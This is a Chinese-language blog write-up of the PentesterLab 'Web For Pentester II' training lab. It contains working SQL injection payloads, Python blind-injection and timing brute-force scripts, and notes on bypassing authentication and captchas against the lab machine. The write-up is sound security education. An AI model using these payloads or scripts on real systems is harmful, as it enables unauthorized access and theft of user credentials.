<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">



<title>Pentesterlab: Web For Pentester II | C0r1&#39;s Blog</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


</head>
<body>
    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">c0r1&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>

        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">c0r1&#39;s Blog</a><a id="mobile-toggle-theme">Â·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
        <div class="main">
            <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "Collapse all"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "Expand all"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">Pentesterlab: Web For Pentester II</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">c0r1</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">March 11, 2020&nbsp;&nbsp;15:04:52</a>
                        </span>
                    
                    
                </div>
            
        </header>

        <div class="post-content">
            <h1 id="&#x524D;&#x8A00;"><a href="#&#x524D;&#x8A00;" class="headerlink" title="&#x524D;&#x8A00;"></a>&#x524D;&#x8A00;</h1><p><a href="https://pentesterlab.com/" target="_blank" rel="noopener">PentesterLab</a> &#x521B;&#x5EFA;&#x7684;&#x5E38;&#x89C1; Web &#x6F0F;&#x6D1E;&#x7B2C;&#x4E8C;&#x5F39;</p>
<p>&#x4F7F;&#x7528; VMware &#x642D;&#x5EFA;&#xFF0C;&#x8FDB;&#x5165;&#x9776;&#x673A;&#x83B7;&#x53D6; IP &#x540E;&#x5C06; IP &#x7ED1;&#x5B9A;&#x5230;&#x672C;&#x673A; Host &#x6587;&#x4EF6;</p>
<p><img src="/2020/03/11/Pentesterlab-Web-For-Pentester-II/1-1.png" alt="image"></p>
<h1 id="Pentest"><a href="#Pentest" class="headerlink" title="Pentest"></a>Pentest</h1><h2 id="SQL-Injections"><a href="#SQL-Injections" class="headerlink" title="SQL Injections"></a>SQL Injections</h2><h3 id="SQL-Example-1"><a href="#SQL-Example-1" class="headerlink" title="SQL Example 1"></a>SQL Example 1</h3><p>&#x767B;&#x5F55;&#x6846;&#xFF0C;&#x5355;&#x5F15;&#x53F7;&#x9003;&#x9038;&#xFF0C;&#x6709;&#x62A5;&#x9519;&#x56DE;&#x663E;</p>
<p>&#x4E07;&#x80FD;&#x5BC6;&#x7801;&#x7834;&#x574F;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#xFF0C;&#x6216;&#x5229;&#x7528;&#x62A5;&#x9519;&#x6CE8;&#x5165;&#x68C0;&#x7D22;&#x6570;&#x636E;&#x5E93;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/sqlinjection/example1/?username=admin%27or+1%23&amp;password=1</span><br></pre></td></tr></table></figure>

<h3 id="SQL-Example-2"><a href="#SQL-Example-2" class="headerlink" title="SQL Example 2"></a>SQL Example 2</h3><p>&#x5355;&#x5F15;&#x53F7;&#x9003;&#x9038;&#xFF0C;&#x4F7F;&#x7528;&#x4E07;&#x80FD;&#x5BC6;&#x7801;&#x6D4B;&#x8BD5;&#x65E0;&#x6548;</p>
<p>&#x6D4B;&#x8BD5; Union &#x6CE8;&#x5165;&#x65F6;&#x3002;&#x3002;&#x7A81;&#x7136;&#x767B;&#x5F55;&#x6210;&#x529F;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/sqlinjection/example2/?username=admin&apos;+union+select+1,2,3--+&amp;password=132</span><br></pre></td></tr></table></figure>

<p>&#x9875;&#x9762;&#x65E0;&#x6709;&#x6548;&#x56DE;&#x663E;&#xFF0C;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x62A5;&#x9519;&#x6CE8;&#x5165;&#x68C0;&#x7D22;&#x6570;&#x636E;&#x5E93;</p>
<p>&#x67E5;&#x770B;&#x6E90;&#x7801;&#x53D1;&#x73B0;&#x662F; Ruby &#x7A0B;&#x5E8F;&#xFF0C;&#x5BF9;&#x67E5;&#x8BE2;&#x7ED3;&#x679C;&#x96C6;&#x5927;&#x5C0F;&#x8FDB;&#x884C;&#x4E86;&#x4E00;&#x6B21;&#x9A8C;&#x8BC1;</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> res.size == <span class="number">1</span></span><br><span class="line">    erb <span class="symbol">:index</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    erb <span class="symbol">:login</span></span><br></pre></td></tr></table></figure>

<p>&#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; limit &#x9650;&#x5236;&#x53EA;&#x53D6;&#x51FA;&#x4E00;&#x6761;&#x6570;&#x636E;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/sqlinjection/example2/?username=admin%27or+1+limit+0,1%23&amp;password=13</span><br></pre></td></tr></table></figure>

<h3 id="SQL-Example-3"><a href="#SQL-Example-3" class="headerlink" title="SQL Example 3"></a>SQL Example 3</h3><p>&#x624B;&#x6D4B;&#x65E0;&#x679C;&#xFF0C;&#x9875;&#x9762;&#x65E0;&#x660E;&#x663E;&#x4FE1;&#x606F;</p>
<p>Burp Fuzz  &#x53D1;&#x73B0;&#x8F93;&#x5165; <code>\</code> &#x65F6;&#x62A5;&#x9519;&#xFF0C;&#x8FD4;&#x56DE; SQL &#x8BED;&#x53E5;&#x7ED3;&#x6784;</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">&apos;\&apos; and password=&apos;</span>xx<span class="string">&apos;</span></span><br></pre></td></tr></table></figure>

<p>&#x770B;&#x6837;&#x5B50;&#x662F;&#x8FC7;&#x6EE4;&#x4E86;&#x5355;&#x5F15;&#x53F7;&#xFF0C;&#x5229;&#x7528;&#x8F6C;&#x4E49;&#x7B26;&#x53EF;&#x4EE5;&#x5728; <code>password</code> &#x5904;&#x6784;&#x9020; Payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=\&amp;password=or+1%23</span><br></pre></td></tr></table></figure>

<h3 id="SQL-Example-4"><a href="#SQL-Example-4" class="headerlink" title="SQL Example 4"></a>SQL Example 4</h3><p>Union &#x6CE8;&#x5165;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/sqlinjection/example4/?req=id=1+union+select+1,(SELECT+GROUP_CONCAT(username,%27@%27,password+SEPARATOR+0x3c62723e)+FROM+users),3</span><br></pre></td></tr></table></figure>

<p>PS&#xFF1A;&#x8FD9;&#x91CC;&#x9875;&#x9762;&#x53EA;&#x80FD;&#x663E;&#x793A; 10 &#x6761;&#x6570;&#x636E;&#xFF0C;&#x4F7F;&#x7528; limit &#x5206;&#x6BB5;&#x53D6;&#x5373;&#x53EF;</p>
<h3 id="SQL-Example-5"><a href="#SQL-Example-5" class="headerlink" title="SQL Example 5"></a>SQL Example 5</h3><p>limit &#x6CE8;&#x5165;&#xFF0C;&#x8BBF;&#x95EE;&#x5982;&#x4E0B;&#x94FE;&#x63A5;&#x83B7;&#x53D6;&#x90E8;&#x5206;&#x7528;&#x6237;&#x4FE1;&#x606F;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/sqlinjection/example5/?limit=1+PROCEDURE+analyse()</span><br></pre></td></tr></table></figure>

<p>&#x62A5;&#x9519;&#x6CE8;&#x5165;&#xFF1A;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/sqlinjection/example5/?limit=2+PROCEDURE+analyse(extractvalue(rand(),concat(0x3a,(select+concat(username,%27@%27,password)+from+users+limit+2,1))),1)</span><br></pre></td></tr></table></figure>

<p>&#x5EF6;&#x65F6;&#x6CE8;&#x5165;&#xFF1A;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/sqlinjection/example5/?limit=2+PROCEDURE+analyse((select+extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1)+LIKE+5,+BENCHMARK(5000000,SHA1(1)),1))))),1)</span><br></pre></td></tr></table></figure>

<p><strong>&#x53E6;&#x5916;&#x9700;&#x8981;&#x6CE8;&#x610F;&#xFF08;&#x53C2;&#x9605;&#xFF1A;<a href="http://www.vuln.cn/8101" target="_blank" rel="noopener">&#x518D;&#x8C08;Mysql&#x4E2D;limit&#x540E;&#x7684;&#x6CE8;&#x5165;</a>&#xFF09;&#xFF1A;</strong></p>
<p>&#x5229;&#x7528; <code>PROCEDURE+analyse()</code> &#x8FDB;&#x884C;&#x62A5;&#x9519;&#x6CE8;&#x5165;&#x548C;&#x5EF6;&#x65F6;&#x6CE8;&#x5165;&#x53EA;&#x9002;&#x7528;&#x4E8E;&#xFF1A;<strong>Mysql 5.0.0 ~ Mysql 5.6.6</strong></p>
<p>Mysql 5.6.6 &#x5BF9; <code>analyse()</code> &#x51FD;&#x6570;&#x8FDB;&#x884C;&#x4E86;&#x6539;&#x5199;&#xFF0C;&#x4E24;&#x4E2A;&#x53C2;&#x6570;&#x90FD;&#x53EA;&#x80FD;&#x4E3A; <code>uint</code></p>
<h3 id="SQL-Example-6"><a href="#SQL-Example-6" class="headerlink" title="SQL Example 6"></a>SQL Example 6</h3><p>&#x53C2;&#x6570;&#x63D2;&#x5165; <code>group by</code> &#x8BED;&#x53E5;&#x540E;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/sqlinjection/example6/?group=username+union+select+1,(SELECT+GROUP_CONCAT(username,%27@%27,password+SEPARATOR+0x3c62723e)+FROM+users),3</span><br></pre></td></tr></table></figure>

<h3 id="SQL-Example-7"><a href="#SQL-Example-7" class="headerlink" title="SQL Example 7"></a>SQL Example 7</h3><p>&#x6570;&#x5B57;&#x578B;&#x6CE8;&#x5165; + <strong>Should only return one user</strong></p>
<p>&#x6D4B; Union &#x6CE8;&#x5165;&#x53D1;&#x73B0;&#x5BF9; <code>name</code> &#x503C;&#x8FDB;&#x884C;&#x4E86;&#x67D0;&#x79CD;&#x6821;&#x9A8C;&#xFF0C;&#x800C;&#x4E14; <code>id</code> &#x4F4D;&#x4E0D;&#x4F1A;&#x56DE;&#x663E;&#x654F;&#x611F;&#x6570;&#x636E;</p>
<p><img src="/2020/03/11/Pentesterlab-Web-For-Pentester-II/2-1-1.png" alt="image"></p>
<p>&#x6709;&#x62A5;&#x9519;&#xFF0C;&#x6709;&#x4E8C;&#x503C;&#x3002;&#x8FD9;&#x91CC;&#x8BD5;&#x4E00;&#x4E0B;&#x5E03;&#x5C14;&#x6CE8;&#x5165;</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">boolSqlCore</span><span class="params">(command, flag)</span>:</span></span><br><span class="line">    get = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        start = <span class="number">32</span></span><br><span class="line">        end = <span class="number">126</span></span><br><span class="line">        <span class="keyword">while</span> start &lt; end:</span><br><span class="line">            mid = (start + end) // <span class="number">2</span></span><br><span class="line">            payload = <span class="string">&quot;ascii(substr((%s),%s,1))&gt;%s&quot;</span>%(command, index, mid)</span><br><span class="line">            url = <span class="string">&quot;http://test.com/sqlinjection/example7/?id=-1+union+select+1,if((%s),&apos;user1&apos;,1),3+limit+1&quot;</span> % (payload) </span><br><span class="line">            <span class="comment">#print(url)</span></span><br><span class="line">            req = requests.get(url)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> flag <span class="keyword">in</span> req.text:</span><br><span class="line">                start = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                end = mid</span><br><span class="line">        <span class="keyword">if</span>(chr(int(start)) == <span class="string">&apos; &apos;</span>):</span><br><span class="line">            print(<span class="string">&quot;\n\r[+] %s End With &apos; &apos;, Please Check&quot;</span>%get)</span><br><span class="line">            <span class="keyword">break</span>    </span><br><span class="line">        get += chr(int(start))</span><br><span class="line">        </span><br><span class="line">        print(get)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&apos;__main__&apos;</span>:</span><br><span class="line">    boolSqlCore(<span class="string">&quot;select concat(username,&apos;@&apos;,password) from users limit 0,1&quot;</span>, <span class="string">&quot;user1&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="SQL-Example-8"><a href="#SQL-Example-8" class="headerlink" title="SQL Example 8"></a>SQL Example 8</h3><p>&#x770B;&#x529F;&#x80FD;&#x662F;&#x4E2A; Insert &#x6CE8;&#x5165;&#xFF0C;&#x63D2;&#x4E86;&#x51E0;&#x6761;&#x6570;&#x636E;&#x53D1;&#x73B0;&#x662F;&#x4E2A;&#x4E8C;&#x6B21;&#x6CE8;&#x5165;&#x3002;&#x6709;&#x62A5;&#x9519;&#xFF0C;&#x76F4;&#x63A5;&#x62A5;&#x9519;&#x6253;</p>
<p>&#x6CE8;&#x518C;&#x7528;&#x6237;&#xFF1A;</p>
<p><code>1&apos; and extractvalue(0x0a,concat(0x0a,(database())))#</code></p>
<p>&#x8BBF;&#x95EE;&#x7528;&#x6237;&#x7A7A;&#x95F4;</p>
<p><img src="/2020/03/11/Pentesterlab-Web-For-Pentester-II/2-1-2.png" alt="image"></p>
<h3 id="SQL-Example-9"><a href="#SQL-Example-9" class="headerlink" title="SQL Example 9"></a>SQL Example 9</h3><p>&#x3002;&#x3002;&#x6574;&#x8499;&#x4E86;&#xFF0C;&#x770B;&#x4E86;&#x6E90;&#x7801;&#x624D;&#x53D1;&#x73B0;&#x662F;&#x5BBD;&#x5B57;&#x8282;&#x6CE8;&#x5165;</p>
<p><img src="/2020/03/11/Pentesterlab-Web-For-Pentester-II/2-1-3.png" alt="image"></p>
<p>&#x6784;&#x9020; <code>username=%df&apos; or 1%23</code></p>
<p><img src="/2020/03/11/Pentesterlab-Web-For-Pentester-II/2-1-4.png" alt="image"></p>
<p>&#x5229;&#x7528;&#x76F2;&#x6CE8;&#xFF0C;&#x6784;&#x9020;&#x4E8C;&#x503C;&#x7684; URL &#x5982;&#x4E0B;&#xFF1A;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/sqlinjection/example9/?username=%df%27+or+2333=(case+when+(1=1)+then+2333+else+0+end)%23&amp;password=123</span><br></pre></td></tr></table></figure>

<p>&#x5C06; Examples 7 &#x4E2D;&#x811A;&#x672C;&#x6807;&#x5FD7;&#x4F4D;&#x548C; <code>url</code> &#x4FEE;&#x6539;&#x4E00;&#x4E0B;&#xFF1A;</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">r&quot;http://test.com/sqlinjection/example9/?username=%df%27+or+2333=(case+when+({})+then+2333+else+0+end)%23&amp;password=123&quot;</span>.format(payload)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;Success!!!&quot;</span></span><br></pre></td></tr></table></figure>

<p>&#x7ED3;&#x679C;&#x5982;&#x4E0B;&#xFF1A;<code>80808</code> &#x5206;&#x9694;&#x7528;&#x6237;&#x540D;&#x3001;&#x5BC6;&#x7801;&#x5B57;&#x6BB5;&#xFF0C;&#x65B9;&#x4FBF;&#x67E5;&#x770B;</p>
<p><img src="/2020/03/11/Pentesterlab-Web-For-Pentester-II/2-1-5.png" alt="image"></p>
<h2 id="Authentication"><a href="#Authentication" class="headerlink" title="Authentication"></a>Authentication</h2><h3 id="Auth-Example-1"><a href="#Auth-Example-1" class="headerlink" title="Auth Example 1"></a>Auth Example 1</h3><p>Basic &#x9A8C;&#x8BC1;&#xFF0C;&#x5229;&#x7528; Burp Intruder &#x6A21;&#x5757;&#x7206;&#x7834;</p>
<p><img src="/2020/03/11/Pentesterlab-Web-For-Pentester-II/2-2-1.png" alt="image"></p>
<p>&#x89E3;&#x5F00;&#x5F97;&#x5230;&#xFF1A;<code>admin:admin</code></p>
<h3 id="Auth-Example-2"><a href="#Auth-Example-2" class="headerlink" title="Auth Example 2"></a>Auth Example 2</h3><p>&#x5355;&#x7EAF;&#x7684;&#x7206;&#x7834;&#x6CA1;&#x6709;&#x6548;&#x679C;&#xFF0C;&#x770B;&#x6E90;&#x7801;&#x53D1;&#x73B0; Response &#x5305;&#x6709;&#x56DE;&#x663E; Tips&#x3002;&#x3002;</p>
<p>&#x5173;&#x952E;&#x903B;&#x8F91;&#xFF1A;</p>
<p><img src="/2020/03/11/Pentesterlab-Web-For-Pentester-II/2-2-2.png" alt="image"></p>
<p>&#x811A;&#x672C;&#x5BF9;&#x9A8C;&#x8BC1;&#x4FE1;&#x606F;&#x6309;&#x4F4D;&#x6BD4;&#x8F83;&#xFF0C;&#x6BCF;&#x4E00;&#x4F4D;&#x6BD4;&#x8F83;&#x6210;&#x529F;&#x5EF6;&#x65F6; 0.2 &#x79D2;&#xFF0C;&#x6BD4;&#x8F83;&#x5931;&#x8D25;&#x9000;&#x51FA;&#x7A0B;&#x5E8F;</p>
<p>&#x5728;&#x7F51;&#x7EDC;&#x6CE2;&#x52A8;&#x8F83;&#x5C0F;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x53EF;&#x4EE5;&#x5F88;&#x65B9;&#x4FBF;&#x7684;&#x4EE5;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x4F5C;&#x4E3A;&#x5224;&#x65AD;&#x6761;&#x4EF6;&#xFF0C;&#x6309;&#x4F4D;&#x7206;&#x7834;</p>
<p>&#x5DF2;&#x77E5;&#x7528;&#x6237;&#x540D;&#xFF1A;<code>hacker</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://test.com/authentication/example2/&quot;</span></span><br><span class="line">prefix = <span class="string">&quot;hacker:&quot;</span></span><br><span class="line">baseTime = <span class="number">1.4</span></span><br><span class="line">passwd = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> string.printable:</span><br><span class="line">        padding = prefix + <span class="string">&quot;&quot;</span>.join(passwd) + _</span><br><span class="line">        headers = {<span class="string">&quot;Authorization&quot;</span>:<span class="string">&quot;Basic %s&quot;</span> % base64.b64encode(padding.encode()).decode()}</span><br><span class="line"></span><br><span class="line">        startTime = time.time()</span><br><span class="line">        req = requests.get(url, headers=headers)</span><br><span class="line">        waitTime = time.time() - startTime</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> waitTime - baseTime &gt; <span class="number">0.2</span>:</span><br><span class="line">            passwd.append(_)</span><br><span class="line">            print(<span class="string">&quot;[*] Password: &quot;</span> + <span class="string">&quot;&quot;</span>.join(passwd))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> _ == <span class="string">&apos;\x0c&apos;</span>: exit(<span class="string">&quot;[+] Done! The Password is: {}&quot;</span>.format(<span class="string">&quot;&quot;</span>.join(passwd)))</span><br><span class="line"></span><br><span class="line">    baseTime += <span class="number">0.2</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/11/Pentesterlab-Web-For-Pentester-II/2-2-3.png" alt="image"></p>
<h3 id="Auth-Example-3"><a href="#Auth-Example-3" class="headerlink" title="Auth Example 3"></a>Auth Example 3</h3><p><code>logout</code> &#x65F6;&#xFF1A; </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: user=user1; rack.session=5a3452a96040afa51ce90e454c15f425ff28e02a9c00e6954e792ce5ca4ebad9</span><br></pre></td></tr></table></figure>

<p>&#x4E0D;&#x767B;&#x9646;&#xFF0C;&#x76F4;&#x63A5;&#x4FEE;&#x6539; <code>user=admin</code> &#x518D;&#x5237;&#x65B0;&#x9875;&#x9762;</p>
<h3 id="Auth-Example-4"><a href="#Auth-Example-4" class="headerlink" title="Auth Example 4"></a>Auth Example 4</h3><p>Cookie &#x4F2A;&#x9020;&#xFF0C;user &#x53C2;&#x6570;&#x4E3A; <code>md5(&apos;user1&apos;)</code>&#xFF0C;&#x6539;&#x6210; <code>md5(&apos;admin&apos;)</code></p>
<h3 id="Auth-Example-5"><a href="#Auth-Example-5" class="headerlink" title="Auth Example 5"></a>Auth Example 5</h3><p>&#x8BD5;&#x4E86;&#x4E00;&#x4E0B; SQL &#x7EA6;&#x675F;&#x653B;&#x51FB;&#xFF0C;&#x6CA1;&#x6548;&#x679C;</p>
<p>&#x8FD9;&#x91CC;&#x6709;&#x4E00;&#x4E2A;&#x5C0F; Trick&#xFF1A;MySQL &#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x5BF9; <code>VARCHAR</code> &#x7C7B;&#x578B;&#x6BD4;&#x8F83;&#xFF0C;&#x4E0D;&#x533A;&#x5206;&#x5927;&#x5C0F;&#x5199;</p>
<p>&#x5229;&#x7528;&#x524D;&#x540E;&#x7AEF;&#x6BD4;&#x8F83;&#x8FD0;&#x7B97;&#x5DEE;&#x5F02; Bypass</p>
<h3 id="Auth-Example-6"><a href="#Auth-Example-6" class="headerlink" title="Auth Example 6"></a>Auth Example 6</h3><p>&#x8FD9;&#x91CC;&#x5BF9;&#x7528;&#x6237;&#x540D;&#x8FDB;&#x884C;&#x5927;&#x5C0F;&#x5199;&#x9A8C;&#x8BC1;&#x4E86;</p>
<p>&#x6CE8;&#x518C;&#x7528;&#x6237;&#xFF1A;<code>admin&#x7A7A;&#x683C;</code> &#x53EF;&#x7ED5;&#x8FC7;&#x9A8C;&#x8BC1;&#xFF0C;&#x4F8B; 5 &#x4E2D;&#x4E5F;&#x53EF;&#x4EE5;&#x7528;&#x8BE5;&#x65B9;&#x5F0F;&#x7ED5;&#x8FC7;</p>
<h2 id="Captcha"><a href="#Captcha" class="headerlink" title="Captcha"></a>Captcha</h2><h3 id="Captcha-Example-1"><a href="#Captcha-Example-1" class="headerlink" title="Captcha Example 1"></a>Captcha Example 1</h3><p>&#x6293;&#x5305;&#x5220;&#x9664; <code>captcha</code> &#x53C2;&#x6570;&#x5373;&#x53EF;</p>
<h3 id="Captcha-Example-2"><a href="#Captcha-Example-2" class="headerlink" title="Captcha Example 2"></a>Captcha Example 2</h3><p>&#x9A8C;&#x8BC1;&#x7801;&#x8FD4;&#x56DE;&#x5230;&#x524D;&#x7AEF;&#x9690;&#x85CF;&#x8868;&#x5355;&#xFF0C;&#x4FDD;&#x6301; <code>captcha</code>&#x3001;<code>answer</code> &#x4E00;&#x81F4;&#x5373;&#x53EF;</p>
<p>&#x53E6;&#x5916;&#x4E00;&#x4E2D;&#x95EE;&#x9898;&#x4EFB;&#x7136;&#x5B58;&#x5728;&#xFF0C;&#x5220;&#x9664;&#x53C2;&#x6570;&#x76F4;&#x63A5;&#x901A;&#x8FC7;&#x9A8C;&#x8BC1;</p>
<h3 id="Captcha-Example-3"><a href="#Captcha-Example-3" class="headerlink" title="Captcha Example 3"></a>Captcha Example 3</h3><p>&#x9A8C;&#x8BC1;&#x7801;&#x53CD;&#x5E94;&#x5728; Cookie &#x4E2D;</p>
<h3 id="Captcha-Example-4"><a href="#Captcha-Example-4" class="headerlink" title="Captcha Example 4"></a>Captcha Example 4</h3><p>&#x3002;&#x3002;&#x9A8C;&#x8BC1;&#x7801;&#x4E0D;&#x5931;&#x6548;&#xFF0C;&#x53EF;&#x4EE5;&#x91CD;&#x590D;&#x7206;&#x7834;</p>
<h3 id="Captcha-Example-5"><a href="#Captcha-Example-5" class="headerlink" title="Captcha Example 5"></a>Captcha Example 5</h3><p>&#x5B98;&#x65B9;&#x7684;&#x610F;&#x601D;&#x662F;&#x9A8C;&#x8BC1;&#x7801;&#x56FE;&#x7247;&#x6570;&#x91CF;&#x6709;&#x9650;&#xFF0C;&#x6BCF;&#x4E2A;&#x9A8C;&#x8BC1;&#x7801;&#x751F;&#x6210;&#x7684;&#x56FE;&#x7247;&#x4E00;&#x81F4;&#xFF0C;&#x53EF;&#x4EE5;&#x5C06;&#x6240;&#x6709;&#x9A8C;&#x8BC1;&#x7801;&#x6536;&#x96C6;&#x5230;&#x672C;&#x5730;&#xFF0C;&#x505A;&#x6210;&#x5F69;&#x8679;&#x8868;</p>
<h3 id="Captcha-Example-6"><a href="#Captcha-Example-6" class="headerlink" title="Captcha Example 6"></a>Captcha Example 6</h3><p>&#x9A8C;&#x8BC1;&#x7801;&#x56FE;&#x7247;&#x5F88;&#x6E05;&#x6670;&#xFF0C;&#x8BC6;&#x522B;&#x8F6F;&#x4EF6;&#x8BC6;&#x522B;&#x6210;&#x529F;&#x7387;&#x8F83;&#x9AD8;</p>
